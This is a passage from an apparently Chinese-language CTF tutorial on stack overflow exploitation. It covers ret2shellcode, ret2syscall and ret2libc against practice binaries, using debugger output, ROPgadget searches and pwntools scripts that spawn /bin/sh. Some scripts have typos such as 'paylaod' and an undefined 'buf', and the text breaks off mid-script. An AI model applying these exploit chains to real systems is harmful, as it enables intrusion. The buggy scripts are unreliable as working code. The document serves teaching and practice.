&lt;main+38&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;</span><br><span class="line">───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd540 ◂— 0x1</span><br><span class="line">02:0008│      0xffffd544 —▸ 0xffffd5d4 —▸ 0xffffd71a ◂— &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode&#39;</span><br><span class="line">03:000c│      0xffffd548 —▸ 0xffffd5dc —▸ 0xffffd73f ◂— &#39;LANG&#x3D;en_US.UTF-8&#39;</span><br><span class="line">04:0010│      0xffffd54c —▸ 0xffffd564 ◂— 0x0</span><br><span class="line">05:0014│      0xffffd550 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd554 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd558 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line">─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  804852d main</span><br><span class="line">   f 1 f7df2f21 __libc_start_main+241</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0xf7dda000 0xf7faf000 r-xp   1d5000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7faf000 0xf7fb0000 ---p     1000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb0000 0xf7fb2000 r-xp     2000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 rwxp     1000 1d7000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb6000 rwxp     3000 0</span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0</span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><p>具体的 payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">buf2_addr &#x3D; 0x804a080</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>题目 </p><ul><li>sniperoj-pwn100-shellcode-x86-64</li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>首先检测程序开启的保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2syscall</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2syscall&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201223161605795.png" alt="image-20201223161605795"></p><p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p><ul><li><a href="https://zh.wikipedia.org/wiki/系统调用">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li></ul><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里，选择</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080be408 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;int&#39;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">bin_sh &#x3D; 0x080be408</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><blockquote><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p></blockquote><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>这里我们以 bamboofox 中 ret2libc1 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>首先，我们可以检查一下程序的安全保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2libc1</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc1&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x08048720 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure><p>那么我们直接返回该处，执行system函数。payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line"></span><br><span class="line">bin_bash &#x3D; 0x08048720</span><br><span class="line">system_addr &#x3D; 0x08048460</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; *112, system_addr, &#39;bbbb&#39; , bin_bash])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p><h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048490 _system</span><br><span class="line">.plt:08048460 _gets           </span><br><span class="line">.bss:0804A080 buf2 </span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure><p>payload1 堆栈平衡(在调用完gets之后要把调用的参数给pop出来，提升栈堆(保持esp和ebp的值不变)再对system进行调用)如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, pop_ebx_addr, buf2_addr, system_addr , &#39;aaaa&#39; , buf])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>payload2 :</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201227101548054.png" alt="image-20201227101548054" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, system_addr, buf2_addr, buf2_addr])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc3&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>手动寻找：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;libc.blukat.me&#x2F;</span><br><span class="line"></span><br><span class="line">$ .&#x2F;find __libc_start_main d90</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.27-3ubuntu1_i386.deb (id libc6_2.27-3ubuntu1_i386)</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6-i386_2.27-3ubuntu1_amd64.deb (id libc6-i386_2.27-3ubuntu1_amd64)</span><br><span class="line"></span><br><span class="line">$ .&#x2F;dump libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">offset___libc_start_main_ret &#x3D; 0x18e81</span><br><span class="line">offset_system &#x3D; 0x0003cd10</span><br><span class="line">offset_dup2 &#x3D; 0x000e6110</span><br><span class="line">offset_read &#x3D; 0x000e5620</span><br><span class="line">offset_write &#x3D; 0x000e56f0</span><br><span class="line">offset_str_bin_sh &#x3D; 0x17b8cf</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span 